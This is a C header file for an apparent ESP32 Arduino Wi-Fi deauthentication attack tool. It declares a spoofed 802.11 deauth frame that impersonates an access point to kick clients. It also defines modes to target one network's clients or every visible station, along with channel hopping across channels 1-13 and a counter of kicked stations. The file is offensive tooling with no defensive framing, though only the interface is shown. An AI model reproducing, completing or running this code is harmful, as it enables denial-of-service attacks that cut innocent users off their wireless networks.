#ifndef DEAUTH_H
#define DEAUTH_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ─── CONFIG ──────────────────────────────────────────────────────────────────
#define SERIAL_DEBUG                   // comment out to silence serial output
#define CHANNEL_MAX           13
#define NUM_FRAMES_PER_DEAUTH 16
#define DEAUTH_TYPE_SINGLE    0        // kick only clients of one target AP
#define DEAUTH_TYPE_ALL       1        // kick every station visible on air
#define MAX_NETWORKS          20

// ─── DEBUG MACROS ────────────────────────────────────────────────────────────
#ifdef SERIAL_DEBUG
  #define DBG_PRINT(...)   Serial.print(__VA_ARGS__)
  #define DBG_PRINTLN(...) Serial.println(__VA_ARGS__)
  #define DBG_PRINTF(...)  Serial.printf(__VA_ARGS__)
#else
  #define DBG_PRINT(...)
  #define DBG_PRINTLN(...)
  #define DBG_PRINTF(...)
#endif

// ─── 802.11 STRUCTS ──────────────────────────────────────────────────────────
typedef struct {
  uint8_t  frame_control[2]     = { 0xC0, 0x00 };
  uint8_t  duration[2];
  uint8_t  station[6];           // client being kicked
  uint8_t  sender[6];            // spoofed as AP
  uint8_t  access_point[6];
  uint8_t  fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t  dest[6];
  uint8_t  src[6];
  uint8_t  bssid[6];
  uint16_t sequence_ctrl;
  uint8_t  addr4[6];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t   payload[0];
} wifi_packet_t;

// ─── SCAN CACHE ──────────────────────────────────────────────────────────────
struct NetworkInfo {
  String  ssid;
  String  bssid;
  int32_t rssi;
  int     channel;
};

extern NetworkInfo foundNetworks[MAX_NETWORKS];
extern int         foundCount;

// ─── STATE ───────────────────────────────────────────────────────────────────
extern int  eliminated_stations;
extern int  deauth_type;
extern bool deauth_running;

// ─── PUBLIC API ──────────────────────────────────────────────────────────────

// Scan nearby networks; caches results; returns count found
int  scan_networks();

// Print the last cached scan without rescanning
void print_networks();

// Start deauth: index is 0-based from last scan, type = DEAUTH_TYPE_SINGLE/ALL
void start_deauth(int index, int attack_type, uint16_t reason);

// Stop any running attack
void stop_deauth();

// Start attack and automatically cycle through channels 1-13 every dwell_ms
void channel_hop_deauth(int index, int attack_type, uint16_t reason, unsigned long dwell_ms);

// Must be called every loop() — advances channel hop timer
void update_hop();

// Manually jump to a channel (1-13)
void set_channel(int channel);

// How many deauth bursts have been sent since last start_deauth()
int  get_kick_count();

// Print running/stopped status to serial
void print_status();

#endif
